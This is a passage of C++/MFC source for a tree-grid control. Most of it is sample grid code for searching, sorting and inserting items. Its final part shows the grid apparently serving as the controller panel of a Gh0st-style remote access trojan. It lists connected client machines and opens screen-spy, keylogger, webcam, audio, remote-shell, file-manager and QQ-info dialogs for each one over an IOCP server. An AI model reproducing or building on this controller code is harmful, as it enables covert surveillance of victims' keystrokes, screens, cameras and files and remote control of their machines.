LVS_EX_CHECKBOXES
LVS_EX_FLATSB
all other ExStyles are not supported...buhhh and you call your self a windows-developer :(
	*/
	//	SetExtendedStyle(LVS_EX_GRIDLINES/*|LVS_EX_CHECKBOXES*/);
	
	LV_COLUMN   lvColumn;
	
	//initialize the columns
	lvColumn.mask = LVCF_FMT | LVCF_WIDTH | LVCF_TEXT | LVCF_SUBITEM;
	lvColumn.fmt = LVCFMT_CENTER;
	//	lvColumn.cx = 200;
	/*if (!((CWindsApp *)AfxGetApp())->m_bIsQQwryExist)
		g_Heart_Num--;*/
	for(int x = 0; x < g_Heart_Num; x++)
    {
		//make the secondary columns smaller
		lvColumn.pszText = g_Heart_Data[x].title;
		lvColumn.cx = g_Heart_Data[x].nWidth;
		InsertColumn(x, &lvColumn);
    }
		//CXTPPaintManager::SetTheme(xtpThemeVisualStudio2010);	
}


//helper function to copy CItemInfo used when drag/drop you must override this this function to suit your own CItemInfo class
CItemInfo* CMySuperGrid::CopyData(CItemInfo* lpSrc)
{
	ASSERT(lpSrc!=NULL);
	CItemInfo* lpDest = new CItemInfo;
	//well okay I put all the copy thing in one function, located in CItemInfo class, 
	//so you should check out this function, remember to modify this function each time you add new data to CItemInfo class.
	lpDest->CopyObjects(lpSrc);
	return lpDest;
}


//override, like red!
COLORREF CMySuperGrid::GetCellRGB()
{
	return RGB(192,0,0);
}


//this is my override of GetIcon, override this to set what ever icon suits you
int CMySuperGrid::GetIcon(const CTreeItem* pItem)
{
	if(pItem!=NULL)
	{
		int n = GetData(pItem)->GetImage();
		if(n!=-1)
			return n;
		
		int iImage = 0;
		if(ItemHasChildren(pItem))
		{
			IsCollapsed(pItem) ? iImage = 1/*close icon*/:iImage = 0;/*open icon*/
		}
		else
			iImage = 2;//doc icon
		return iImage;
	}
	return 0;
}



//override
void CMySuperGrid::OnUpdateListViewItem(CTreeItem* lpItem, LV_ITEM *plvItem)
{
	//put some extra validation here 
	CString str = (CString)plvItem->pszText;
	if(!str.Compare(_T("Bugs: Impossible")))
	{
		str+=_T(" (selfconfidence allright)");//that's valid enough	:?
		CItemInfo *lp = GetData(lpItem);
		if(lp!=NULL)
		{
			if(plvItem->iSubItem==0)
				lp->SetItemText(str);
			else //subitem data 
				lp->SetSubItemText(plvItem->iSubItem-1, str);
			UpdateData(lpItem, lp); //update internal nodes
		}
		SetItemText(plvItem->iItem, plvItem->iSubItem, str.GetBuffer(1));
	}
	else
		CSuperGridCtrl::OnUpdateListViewItem(lpItem, plvItem);
}




BOOL CMySuperGrid::OnItemLButtonDown(LVHITTESTINFO& ht)
{
	if(ht.iItem!=-1)
	{
#ifdef _WHAT_EVER_
		CTreeItem*pSelItem = GetTreeItem(ht.iItem);
		if(pSelItem!=NULL)
		{	
			CItemInfo* pInfo = GetData(pSelItem);
			if((ht.iSubItem==0) && (pInfo->GetItemText()==CString(_T("Hello World"))))
			{
				AfxMessageBox("no can do buddy");
				return 0;
			}
			
			for(int i=0;i<pInfo->GetItemCount(); i++)
			{
				if(i==ht.iSubItem-1)
				{
					CString str=pInfo->GetSubItem(i);
					if(str == CString(_T("Ethan Hunt"))) 
					{
						AfxMessageBox("Tom Cruise\nliked him in a few good men");
						return 0;
					}
				}
			}
		}
#endif
	}
	return 1;
}

//override called when OnLButtondown
void CMySuperGrid::OnControlLButtonDown(UINT nFlags, CPoint point, LVHITTESTINFO& ht)
{
	//now I am sure I added a combobox some where, so check for this control
	CTreeItem*pSelItem = GetTreeItem(ht.iItem);
	if(pSelItem!=NULL)
	{	
		CItemInfo* pInfo = GetData(pSelItem);
		CItemInfo::CONTROLTYPE ctrlType;
		if(pInfo->GetControlType(ht.iSubItem-1, ctrlType))
		{	
			if(ctrlType==pInfo->CONTROLTYPE::combobox) 
			{
				CStringList* list=NULL;
				pInfo->GetListData(ht.iSubItem-1, list);
				CComboBox * pList = ShowList(ht.iItem, ht.iSubItem, list);
			}
		}								
		/*
		else //activate default edit control
		CSuperGridCtrl::OnControlLButtonDown(nFlags, point, ht);
		*/
	}
}



BOOL CMySuperGrid::OnVkReturn()
{	
/*
BOOL bResult=FALSE;
int iItem = GetNextItem( -1, LVNI_ALL | LVNI_SELECTED);
if( GetCurSubItem() != -1 && iItem != -1)
{
CTreeItem*pSelItem = GetTreeItem(iItem);
if(pSelItem!=NULL)
{	
CHeaderCtrl* pHeader = (CHeaderCtrl*)GetDlgItem(0);
int iSubItem = Header_OrderToIndex(pHeader->m_hWnd, GetCurSubItem());
CItemInfo* pInfo = GetData(pSelItem);
CItemInfo::CONTROLTYPE ctrlType;
if(pInfo->GetControlType(iSubItem-1, ctrlType))
{	
switch(ctrlType)
{
//put in your own control here
case pInfo->CONTROLTYPE::datecontrol:break;
case pInfo->CONTROLTYPE::spinbutton:break;
case pInfo->CONTROLTYPE::dropdownlistviewwhatevercontrol:break;
case pInfo->CONTROLTYPE::combobox: 
{

  CStringList* list=NULL;
  pInfo->GetListData(iSubItem-1, list);
  CComboBox * pList = ShowList(iItem, iSubItem, list);
  bResult=TRUE; //I'll handle it from here
  }break;
  default:break;
  }
  }
		}
		}
		return bResult;
	*/
	return 0;
}





//#define IDC_COMBOBOXINLISTVIEW 0x1235
CComboBox* CMySuperGrid::ShowList(int nItem, int nCol, CStringList *lstItems)
{	
	return 0;
	/*
	CString strFind = GetItemText(nItem, nCol);
	
	  //basic code start
	  CRect rect;
	  int offset = 0;
	  // Make sure that the item is visible
	  if( !EnsureVisible(nItem, TRUE)) return NULL;
	  GetSubItemRect(nItem, nCol, LVIR_BOUNDS, rect);
	  // Now scroll if we need to expose the column
	  CRect rcClient;
	  GetClientRect(rcClient);
	  if( offset + rect.left < 0 || offset + rect.left > rcClient.right )
	  {
	  CSize size;
	  size.cx = offset + rect.left;
	  size.cy = 0;
	  Scroll(size);
	  rect.left -= size.cx;
	  }
	  
		rect.left += offset;	
		rect.right = rect.left + GetColumnWidth(nCol);
		if(rect.right > rcClient.right) 
		rect.right = rcClient.right;
		//basic code end
		
		  rect.bottom += 10 * rect.Height();//dropdown area
		  
			DWORD dwStyle =  WS_CHILD | WS_VISIBLE | WS_VSCROLL | WS_HSCROLL|CBS_DROPDOWNLIST | CBS_DISABLENOSCROLL;
			/*
			CComboBox *pList = new CComboInListView(nItem, nCol, lstItems);
			pList->Create(dwStyle, rect, this, IDC_COMBOBOXINLISTVIEW);
			pList->ModifyStyleEx(0,WS_EX_CLIENTEDGE);//can we tell at all
			pList->SetHorizontalExtent(CalcHorzExtent(pList, lstItems));
			pList->ShowDropDown();
			pList->SelectString(-1, strFind.GetBuffer(1));
			// The returned pointer should not be saved
			return pList;
	*/
}



int CMySuperGrid::CalcHorzExtent(CWnd* pWnd, CStringList *pList)
{
	int nExtent=0;
	if(pWnd!=NULL)
	{
		CDC* pDC = pWnd->GetDC();
		HFONT hFont = (HFONT)pWnd->SendMessage(WM_GETFONT); //why not pWnd->GetFont();..I like the send thing alot and
		CFont *pFont = CFont::FromHandle(hFont);			//this way I get to use this function..cool :)
		if(pFont!=NULL)										//ya what ever makes me happy,.right :}
		{
			CFont* pOldFont = pDC->SelectObject(pFont);
			CSize newExtent;
			POSITION pos = pList->GetHeadPosition();
			while(pos != NULL)
			{
				CString str(pList->GetNext(pos));
				newExtent = pDC->GetTextExtent(str);
				newExtent.cx += 6;
				if (newExtent.cx > nExtent)
				{
					nExtent = newExtent.cx;
				}
			}
			pDC->SelectObject(pOldFont);
		}
		pWnd->ReleaseDC(pDC);
	}
	return nExtent;
}


//HOWTO: 
void CMySuperGrid::HowToInsertItemsAfterTheGridHasBeenInitialized(int nIndex, const CString& str)
{
	CTreeItem *pSelItem = GetTreeItem(nIndex);
	if(pSelItem != NULL)
	{
		SetRedraw(0);
		BOOL bUpdate = FALSE;
		if(!IsCollapsed(pSelItem))
			bUpdate = TRUE;//Children are expanded, want to see update right away if not no visual update
		
		CItemInfo* lpRelative = new CItemInfo();
		lpRelative->SetItemText(str);
		lpRelative->AddSubItemText(_T("I am"));
		lpRelative->AddSubItemText(_T("now"));
		lpRelative->AddSubItemText(_T("going to insert"));
		lpRelative->AddSubItemText(_T("some items"));
		
		CTreeItem* pParent = InsertItem(pSelItem, lpRelative, bUpdate);
		for(int i=0; i < GetNumCol(); i++)
		{
			CItemInfo* lpItemInfo = new CItemInfo();
			CString strItem;
			strItem.Format(_T("Item %d"), i);
			//add items text
			lpItemInfo->SetItemText(strItem);
			//add subitem text
			for(int y=0;y < GetNumCol()-1; y++) 
			{
				CString str;
				str.Format(_T("SubItem %d of %s"), y, lpItemInfo->GetItemText());
				lpItemInfo->AddSubItemText(str);
			}
			//set combobox in last col
			lpItemInfo->SetControlType(lpItemInfo->CONTROLTYPE::combobox, GetNumCol()-2);
			CStringList list;
			for(int x = 0; x < 3; x++)
			{
				CString str;
				str.Format("ListItem %d",x);
				list.AddTail(str);
			}
			lpItemInfo->SetListData(GetNumCol()-2, &list);
			
			InsertItem(pParent, lpItemInfo);
		}
		SetRedraw(1);
		InvalidateRect(NULL);
		UpdateWindow();
	}
}



void CMySuperGrid::HowToLoopThroughAllItems_if_we_wanted_to_print_them_or_what_ever(CDC *pDC)
{
	TEXTMETRIC tm;
	pDC->GetTextMetrics(&tm);
	int cy = tm.tmHeight + tm.tmExternalLeading;
	int nLineY=0;
	nLineY+=cy;
	
	pDC->TextOut(10, nLineY, _T("GIVE ME A BREAK YOU KNOW PRINT PREVIEW IS NOT THE ISSUE HERE"));
	nLineY+=cy;
	nLineY+=cy;
	int nIndex = GetNextItem(-1, LVNI_ALL | LVNI_SELECTED); //print from current node
	if(nIndex!=-1)
	{
		//GetHeadPosition
		POSITION pos = GetRootHeadPosition();
		while(pos != NULL)
		{
			CTreeItem *pParent =(CTreeItem*)GetNextRoot(pos); 
			CTreeItem *pItem = pParent;
			CItemInfo* lp = GetData(pParent);
			
			CString strData = lp->GetItemText();
			strData+='\t';
			nLineY+=cy;
			for(int nCol=0; nCol < lp->GetItemCount(); nCol++)
			{
				CString str = lp->GetSubItem(nCol);
				strData+=str;
				strData+='\t';
			}	
			pDC->TabbedTextOut(10,nLineY,strData,strData.GetLength(), 0, NULL, 0);
			nLineY+=cy;
			//GetNext ....loop through all children 
			for(;;)
			{
				CTreeItem *pCur = GetNext(pParent,pItem, TRUE, FALSE/*regardless of the item are hidden or not*/);	  
				
				if(!IsChildOf(pParent, pCur))
					break;
				else
					if(pCur==pItem)
						break;
					
					CItemInfo* lp = GetData(pCur);
					CString strData = lp->GetItemText();
					strData+='\t';
					for(int nCol=0; nCol < lp->GetItemCount(); nCol++)
					{
						CString str = lp->GetSubItem(nCol);
						strData+=str;
						strData+='\t';
					}	
					pDC->TabbedTextOut(10,nLineY,strData,strData.GetLength(), 0, NULL, 0);
					nLineY+=cy;
					pItem=pCur;
			}
		}
	}
}



void CMySuperGrid::HowToLoopThroughAllItems_that_has_a_checkmark_and_print_them_or_what_ever(CDC *pDC)
{
	TEXTMETRIC tm;
	pDC->GetTextMetrics(&tm);
	int cy = tm.tmHeight + tm.tmExternalLeading;
	int nLineY=0;
	nLineY+=cy;
	
	pDC->TextOut(10,nLineY,_T("GIVE ME A BREAK YOU KNOW PRINT PREVIEW IS NOT THE ISSUE HERE"));
	nLineY+=cy;
	nLineY+=cy;
	if(!GetItemCount())
		return;
	
	int nIndex=0;//has to be the root 
	if(nIndex!=-1)
	{
		//do a GetHeadPosition
		POSITION pos = GetRootHeadPosition();
		while(pos != NULL)
		{
			CTreeItem *pParent = (CTreeItem*)GetNextRoot(pos); 
			CTreeItem *pItem = pParent;
			CItemInfo* lp = GetData(pParent);
			if(lp->GetCheck())//very hard :)=
			{
				CString strData=lp->GetItemText();
				strData+='\t';
				nLineY+=cy;
				for(int nCol=0; nCol < lp->GetItemCount(); nCol++)
					
				{
					CString str = lp->GetSubItem(nCol);
					strData+=str;
					strData+='\t';
				}	
				pDC->TabbedTextOut(10,nLineY,strData,strData.GetLength(), 0, NULL, 0);
				nLineY+=cy;
			}
			//GetNext ....loop through all children 
			for(;;)
			{
				CTreeItem *pCur = GetNext(pParent, pItem, TRUE, FALSE/*regardless of the item are hidden or not*/);	  
				if(!IsChildOf(pParent, pCur))
					break;
				else
					if(pCur==pItem)
						break;
					
					
					CItemInfo* lp = GetData(pCur);
					if(lp->GetCheck())
					{
						CString strData = lp->GetItemText();
						strData+='\t';
						for(int nCol=0; nCol < lp->GetItemCount(); nCol++)
						{
							CString str = lp->GetSubItem(nCol);
							strData+=str;
							strData+='\t';
						}	
						pDC->TabbedTextOut(10,nLineY,strData,strData.GetLength(), 0, NULL, 0);
						nLineY+=cy;
					}
					pItem=pCur;
			}
		}//while
	}//if
}


//HOWTO: Search nodeptr that have a specific item and subitems also shows you how to select the node and delete it
void CMySuperGrid::HowToSearch_I_am_using_hardcoded_values_here_cause_I_am_tired_now(void)
{
	
	//one Item and two Subitems
	CTreeItem *pNode =	Search(__T("Hello World"),_T("Happy"),_T("Programming"),NULL);
	
	if(pNode!=NULL)
	{
		CItemInfo *pInfo = GetData(pNode);
		AfxMessageBox(_T("Found Item ") + pInfo->GetItemText());
	}
	else AfxMessageBox(_T("not found"));
	//one Item and one Subitem
	CTreeItem *pNode1 = Search(_T("Mission: Impossible"),_T("Allan Nielsen"),NULL);
	if(pNode1!=NULL)
	{
		CItemInfo *pInfo = GetData(pNode1);
		AfxMessageBox(_T("Found Item ") + pInfo->GetItemText());
		
	}
	else AfxMessageBox(_T("not found"));
	
	//one Item and one Subitem
	CTreeItem *pNode2 = Search(_T("Training Agent"),_T("Mr. Bean"),NULL);
	if(pNode2!=NULL)
	{
		CItemInfo *pInfo = GetData(pNode2);
		AfxMessageBox(_T("Found Item") + pInfo->GetItemText());
	}
	else AfxMessageBox(_T("not found"));
	
	CTreeItem *pNode3 = Search(_T("BC"),NULL);
	if(pNode3!=NULL)
	{
		CItemInfo *pInfo = GetData(pNode3);
		AfxMessageBox(_T("Found Item ") + pInfo->GetItemText());
		int nIndex = SelectNode(pNode3);
		if(nIndex!=-1)
			if(AfxMessageBox(_T("Do you want to delete it"),MB_OKCANCEL)==IDOK)
				DeleteItemEx(pNode3, nIndex);
	}
	else AfxMessageBox(_T("not found"));
	
	CTreeItem *pItem = NULL;
	
	POSITION pos = GetRootHeadPosition();
	while(pos != NULL)
	{
		CTreeItem * pRoot = (CTreeItem*)GetNextRoot(pos); 
		pItem = SearchEx(pRoot, "AB");
		if(pItem!=NULL)
		{
			CItemInfo *pInfo = GetData(pItem);
			AfxMessageBox(_T("Found Item ") + pInfo->GetItemText());
			int nIndex = SelectNode(pItem);
			if(nIndex!=-1)
				if(AfxMessageBox(_T("Do you want to delete it"),MB_OKCANCEL)==IDOK)
					DeleteItemEx(pItem, nIndex);
		}
	}
	
	if( pItem == NULL )
		AfxMessageBox(_T("not found"));
	
	
}



//this is just one way to search items...strItem must match and then all subitems must be
//a match before returning the node
//the search function here search all nodes regardless if collapsed or expanded
CMySuperGrid::CTreeItem* CMySuperGrid::Search(CString strItem,...)
{
	if(!GetItemCount())
		return NULL;
	
	va_list args;
	va_start(args, strItem);
	int nCount=0;
	
	for(;;)
	{
		LPCTSTR lpsz = va_arg(args, LPCTSTR);
		if(lpsz==NULL)
			break;
		nCount++;
	}
	
	
	POSITION pos = GetRootHeadPosition();
	while(pos != NULL)
	{
		CTreeItem *pParent = (CTreeItem*)GetNextRoot(pos); 
		CTreeItem *pItem = pParent;
		CItemInfo* lp = GetData(pParent);
		CString strData = lp->GetItemText();
		if(strData==strItem)//must be a match before going further...suit you self
		{
			va_start(args, strItem);
			int nResult=0;
			for(int i=0; i<nCount;i++)
			{
				LPCTSTR lpsz = va_arg(args, LPCTSTR);   
				for(int nCol=0; nCol < lp->GetItemCount(); nCol++)
				{
					CString str = lp->GetSubItem(nCol);
					if(!str.CompareNoCase(lpsz))
					{
						nResult++;
						break;
					}
				}	
			}
			va_end(args);
			if(nCount==nResult)//all args was found return node
				return pParent;
		}
		
		//GetNext ....loop through all children 
		for(;;)
		{
			CTreeItem *pCur = GetNext(pParent, pItem, TRUE, FALSE/*regardless of the item are hidden or not, set to TRUE if only visible items must be included in the search*/);	  
			if(!IsChildOf(pParent, pCur))
				break;
			else
				if(pCur==pItem)
					break;
				CItemInfo* lp = GetData(pCur);
				CString strData = lp->GetItemText();
				if(strData==strItem)//must be a match before going further
				{
					va_start(args, strItem);
					int nResult=0;
					for(int i=0; i<nCount;i++)
					{
						LPCTSTR lpsz = va_arg(args, LPCTSTR);   
						for(int nCol=0; nCol < lp->GetItemCount(); nCol++)
						{
							CString str = lp->GetSubItem(nCol);
							if(!str.CompareNoCase(lpsz))
							{
								nResult++;
								break;
							}
						}	
					}
					va_end(args);
					if(nCount==nResult)//all args was found return node
						return pCur;
				}
				pItem=pCur;//next;
		}
	}	
	return NULL;
}

CMySuperGrid::CTreeItem* CMySuperGrid::GroupSearch(CString strItem,...)
{
	if(!GetItemCount())
		return NULL;
	//	AfxMessageBox(strItem);
	//	int n = strItem.Find(')');
	
	//	CString strNewItem = strItem.Right(strItem.GetLength() - n - 1);
	//	strNewItem.Format("%d", strItem.GetLength() - n);
	//	AfxMessageBox(strNewItem);
	va_list args;
	va_start(args, strItem);
	int nCount=0;
	
	for(;;)
	{
		LPCTSTR lpsz = va_arg(args, LPCTSTR);
		if(lpsz==NULL)
			break;
		nCount++;
	}
	
	
	POSITION pos = GetRootHeadPosition();
	while(pos != NULL)
	{
		CTreeItem *pParent = (CTreeItem*)GetNextRoot(pos); 
		CTreeItem *pItem = pParent;
		CItemInfo* lp = GetData(pParent);
		CString strData = lp->GetItemText();
		int n = strData.Find(')');
		CString strNewData = strData.Right(strData.GetLength() - n - 1);
		//		AfxMessageBox(strNewData);
		if(strNewData==strItem)//must be a match before going further...suit you self
		{
			//			AfxMessageBox("11");
			va_start(args, strItem);
			int nResult=0;
			for(int i=0; i<nCount;i++)
			{
				LPCTSTR lpsz = va_arg(args, LPCTSTR);   
				for(int nCol=0; nCol < lp->GetItemCount(); nCol++)
				{
					CString str = lp->GetSubItem(nCol);
					AfxMessageBox(str);
					if(!str.CompareNoCase(lpsz))
					{
						nResult++;
						break;
					}
				}	
			}
			va_end(args);
			if(nCount == nResult)//all args was found return node
			{	
				//				AfxMessageBox("0");
				return pParent;
			}
		}
		/*
		//GetNext ....loop through all children 
		for(;;)
		{
		CTreeItem *pCur = GetNext(pParent, pItem, TRUE, FALSE);//regardless of the item are hidden or not, set to TRUE if only visible items must be included in the search	  
		if(!IsChildOf(pParent, pCur))
		break;
		else
		if(pCur==pItem)
		break;
		CItemInfo* lp = GetData(pCur);
		CString strData = lp->GetItemText();
		n = strData.Find(')');
		CString strNewData = strData.Right(strData.GetLength() - n - 1);
		AfxMessageBox(strNewData);
		if(strNewData==strNewItem)//must be a match before going further
		{
		va_start(args, strNewItem);
		int nResult=0;
		for(int i=0; i<nCount;i++)
		{
		LPCTSTR lpsz = va_arg(args, LPCTSTR);   
		for(int nCol=0; nCol < lp->GetItemCount(); nCol++)
		{
		CString str = lp->GetSubItem(nCol);
		if(!str.CompareNoCase(lpsz))
		{
								nResult++;
								break;
								}
								}	
								}
								va_end(args);
								if(nCount==nResult)//all args was found return node
								return pCur;
								}
								pItem=pCur;//next;
								}
		*/
	}	
	return NULL;
}

void CMySuperGrid::SortData()
{
	int nIndex = GetNextItem(-1, LVNI_ALL | LVNI_SELECTED); 
	if(nIndex==-1)
		return;
	
	CTreeItem *pItem = reinterpret_cast<CTreeItem*>(GetItemData(nIndex));
	
	if(AfxMessageBox("Sort all children(Yes)\nor just sort rootitems(No)",MB_YESNO)==IDYES)
		Sort(pItem, TRUE);			
	else
		Sort(pItem, FALSE);			
	//do a simple refresh thing
	if(ItemHasChildren(pItem))
	{
		SetRedraw(0);
		Collapse(pItem);
		Expand(pItem, nIndex);
		SetRedraw(1);
	}
}



//another search thing
CMySuperGrid::CTreeItem* CMySuperGrid::SearchEx(CTreeItem *pStartPosition, CString strItem)
{
	CItemInfo* lp = GetData(pStartPosition);
	//if(lp->GetCheck()) another condition here maybe
	CString strData = lp->GetItemText();
	if(strData==strItem)
	{
		return pStartPosition;
	}
	
	const int nChildren = NumChildren(pStartPosition);
	if (nChildren > 0)
	{
		POSITION pos = GetHeadPosition(pStartPosition);
		while (pos)
		{
			CTreeItem *pChild = GetNextChild(pStartPosition, pos);
			CItemInfo* lp = GetData(pChild);
			CString strData = lp->GetItemText();
			if(strData==strItem)
			{
				return pChild;
			}
		}
	}
	
	POSITION pos = GetHeadPosition(pStartPosition);
	while (pos)
	{
		CTreeItem *pChild = GetNextChild(pStartPosition, pos);
		CItemInfo* lp = GetData(pChild);
		CString strData = lp->GetItemText();
		if(strData==strItem)
		{
			return pChild;
		}
		
		pChild = SearchEx(pChild, strItem);
		if(pChild!=NULL)
			return pChild;
	}
	return NULL;
}





BOOL CMySuperGrid::OnDeleteItem(CTreeItem* pItem, int nIndex)
{
	return 1;
}



BOOL CMySuperGrid::OnItemExpanding(CTreeItem *pItem, int iItem)
{
	return 1;
}


BOOL CMySuperGrid::OnItemExpanded(CTreeItem* pItem, int iItem)
{
	return 1;
}


BOOL CMySuperGrid::OnCollapsing(CTreeItem *pItem)
{
	return 1;
}



BOOL CMySuperGrid::OnItemCollapsed(CTreeItem *pItem)
{
	return 1;
}


CImageList *CMySuperGrid::CreateDragImageEx(int nItem)
{
	if(m_bDrag)
		return CSuperGridCtrl::CreateDragImageEx(GetDragItem());
	else
		return NULL;
}



void CMySuperGrid::_DeleteAll()
{
	DeleteAll();//call CSuperGridCtrl::DeleteAll();
	
	//add some new data
	CItemInfo* lp = new CItemInfo();
	lp->SetImage(4);
	//add item text
	lp->SetItemText(_T("New data"));
	//Create root item
	CTreeItem * pRoot = InsertRootItem(lp);//previous we call CreateTreeCtrl(lp)
	if( pRoot == NULL )
		return;
	//insert items	
	int nCol = GetNumCol();
	for(int i=0; i < nCol; i++)
	{
		CItemInfo* lpItemInfo = new CItemInfo();
		CString strItem;
		strItem.Format(_T("Item %d"),i);
		//add items text
		lpItemInfo->SetItemText(strItem);
		//add subitem text
		for(int y=0;y < nCol-1; y++) 
		{
			CString str;
			str.Format(_T("subItem %d of %s"),y,lpItemInfo->GetItemText());
			lpItemInfo->AddSubItemText(str);
			lpItemInfo->AddSubItemText(str);
		}
		//insert the iteminfo with ParentPtr
		CTreeItem* pParent = InsertItem(pRoot, lpItemInfo);
		//other nodes
		if(i%nCol)
		{
			CTreeItem* pParent1=NULL;
			CTreeItem* pParent2=NULL;
			for(int x=0; x < nCol; x++)
			{
				CItemInfo* lpItemInfo = new CItemInfo();
				CString strItem;
				strItem.Format(_T("Item %d"),x);
				lpItemInfo->SetItemText(strItem);
				for(int z=0; z < nCol-1; z++) 
				{
					CString str;
					str.Format(_T("subItem %d of %s"),z, lpItemInfo->GetItemText());
					lpItemInfo->AddSubItemText(str);
				}
				pParent1 = InsertItem(pParent, lpItemInfo);
				
			}
		}
	}
	//expand one level
	Expand(pRoot, 0 /*listview index 0*/); 
	UINT uflag = LVIS_SELECTED | LVIS_FOCUSED;
	SetItemState(0, uflag, uflag);
}

void CMySuperGrid::DisConnect()
{
	int nItem = GetSelectedItem();
	CTreeItem *pTree = GetTreeItem(nItem);
	if (!IsRoot(pTree))
	{
		if (MessageBox("确认断开连接吗 -:)", "Warning", MB_YESNO | MB_ICONWARNING) == IDNO)
			return;
		ClientContext	*pContext = (ClientContext *)(GetData(pTree)->MyGetItemDate());
		LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
		DeleteItemEx(pTree, pTree->m_nIndex);
		g_pFrame->m_nUpCount--;
		if (pContext)
			UpGroupNum(LoginInfo->szUpGroup);
		switch (pContext->m_Dialog[0])
		{
		case FILEMANAGER_DLG:
		case SCREENSPY_DLG:
		case KEYBOARD_DLG:
		case WEBCAM_DLG:
		case AUDIO_DLG:
		case SHELL_DLG:
		case SYSTEMINFO_DLG:
		case SYSTEM_DLG:
		case SERVICE_DLG:
		case REGEDIT_DLG:
		case CHAT_DLG:
		case QQINFO_DLG:
		case PROXYMAP_DLG:
			((CDialog*)pContext->m_Dialog[1])->DestroyWindow();
		default:
			break;
		}
		//g_pFrame->UpCount();
		//			AfxMessageBox(pContext->m_group);
		
	}
	
	
	// 	CString str;
	//  	str.Format("%d", );
	// 	AfxMessageBox(str);
}

LRESULT CMySuperGrid::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	
	CScreenSpyDlg	*dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_SCREENSPY, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SCREENSPY_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}


afx_msg LRESULT CMySuperGrid::OnOpenWallDialog(WPARAM wParam, LPARAM lParam)
{





	return 0;
}



LRESULT CMySuperGrid::OnOpenKeyBoardDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CKeyBoardDlg	*dlg = new CKeyBoardDlg(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_KEYBOARD, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = KEYBOARD_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMySuperGrid::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
{
	
	ClientContext *pContext = (ClientContext *)lParam;
	
	CFileManagerDlg	*dlg = new CFileManagerDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_FILE, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = FILEMANAGER_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	
	return 0;
}


LRESULT CMySuperGrid::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CShellDlg	*dlg = new CShellDlg(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_SHELL, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SHELL_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMySuperGrid::OnOpenRegDialog(WPARAM wParam, LPARAM lParam)
{
	//ClientContext	*pContext = (ClientContext *)lParam;
	//CRegDlg	*dlg = new CRegDlg(this, m_iocpServer, pContext);
	//
	//// 设置父窗口为卓面
	//dlg->Create(IDD_REGEDIT, GetDesktopWindow());
	//dlg->ShowWindow(SW_SHOW);
	//
	//pContext->m_Dialog[0] = REG_DLG;
	//pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMySuperGrid::OnOpenWebCamDialog(WPARAM wParam, LPARAM lParam)
{
	
	
	ClientContext *pContext = (ClientContext *)lParam;
	CWebCamDlg	*dlg = new CWebCamDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_WEBCAM, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = WEBCAM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMySuperGrid::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CAudioDlg	*dlg = new CAudioDlg(this, m_iocpServer, pContext);
	// 设置父窗口为卓面
	dlg->Create(IDD_AUDIO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = AUDIO_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}


LRESULT CMySuperGrid::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CSystemDlg	*dlg = new CSystemDlg(this, m_iocpServer, pContext);
	
	// 设置父窗口为卓面
	dlg->Create(IDD_SYSTEM, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SYSTEM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}



LRESULT CMySuperGrid::OnOpenServicesDialog(WPARAM wParam, LPARAM lParam)
{
	//ClientContext	*pContext = (ClientContext *)lParam;
	//CServiceDlg	*dlg = new CServiceDlg(this, m_iocpServer, pContext);
	//
	//// 设置父窗口为卓面
	//dlg->Create(IDD_SERVICES, GetDesktopWindow());
	//dlg->ShowWindow(SW_SHOW);
	//
	//pContext->m_Dialog[0] = SERVICE_DLG;
	//pContext->m_Dialog[1] = (int)dlg;
	return 0;
}


LRESULT CMySuperGrid::OnOpenProxyDialog(WPARAM wParam, LPARAM lParam)
{
	//ClientContext	*pContext = (ClientContext *)lParam;
	//CLanProxyDlg	*dlg = new CLanProxyDlg(this, m_iocpServer, pContext);
	//
	//// 设置父窗口为卓面
	//dlg->Create(IDD_LANPROXYDLG, GetDesktopWindow());
	//dlg->ShowWindow(SW_SHOW);
	//
	//pContext->m_Dialog[0] = PROXY_DLG;
	//pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMySuperGrid::OnFindYES(WPARAM wParam, LPARAM lParam)
{	
	ClientContext	*pContext = (ClientContext *)lParam;
	LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
	CTreeItem *pFindRoot = GroupSearch(LoginInfo->szUpGroup, NULL);
	if (pFindRoot == NULL)
		return -1;
	int nCount = NumChildren(pFindRoot);
	if (nCount)
	{
		int nNum = 0;
